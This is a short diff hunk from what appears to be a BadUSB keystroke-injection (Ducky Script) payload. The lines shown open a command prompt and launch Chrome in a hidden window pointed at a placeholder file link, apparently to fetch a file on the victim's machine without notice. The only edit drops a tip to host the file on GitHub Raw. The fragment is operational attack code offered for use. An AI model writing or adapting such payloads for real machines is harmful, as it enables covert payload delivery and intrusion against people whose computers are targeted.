@@ -33,7 +33,7 @@ STRING cmd
 DELAY 300
 ENTER
 DELAY 300
-STRING start chrome -w hidden YOUR FILE LINK (WE Recommend using Github Raw.)
+STRING start chrome -w hidden YOUR FILE LINK
 DELAY 300
 ENTER
 DELAY 600
